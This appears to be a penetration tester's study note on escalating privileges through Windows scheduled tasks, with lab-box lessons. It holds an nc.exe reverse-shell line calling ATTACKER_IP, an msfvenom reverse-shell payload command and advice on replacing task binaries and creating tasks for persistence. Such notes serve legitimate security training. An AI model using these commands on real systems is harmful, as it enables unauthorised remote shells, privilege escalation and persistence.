# Scheduled Tasks

Back to [[Windows-PrivEsc-Methodology]]

## Enumerate
```cmd
schtasks /query /fo TABLE /nh
```
```cmd
schtasks /query /fo LIST /v
```

PowerShell:
```powershell
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Format-Table TaskName,TaskPath,State
```

## What to Look For

- Tasks running as SYSTEM or Administrator
- Tasks calling scripts or binaries you can modify

## Exploit Writable Task Binary

Check permissions:
```cmd
icacls "C:\path\to\task\script.bat"
```

If writable, append reverse shell:
```cmd
echo C:\tmp\nc.exe ATTACKER_IP 443 -e cmd.exe >> "C:\path\to\task\script.bat"
```

Wait for the task to fire, or check its schedule and trigger it if possible.

---

## From Your Boxes

> **Medtech DEV04** (Course) - backup.exe in C:\Temp was executed by a scheduled task
> - What worked: Renamed original to backup.bak.exe, generated `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8443 -f exe > backup.exe`, placed in C:\Temp, waited for task
> - Lesson: If you find a binary in a writable location and it runs periodically, replace it. Check file timestamps to estimate schedule.

> **Squid** (PG) - Used schtasks to create a scheduled task for initial code execution
> - What worked: Created scheduled task that executed payload
> - Lesson: You can also CREATE scheduled tasks for persistence or execution if you have the right permissions.
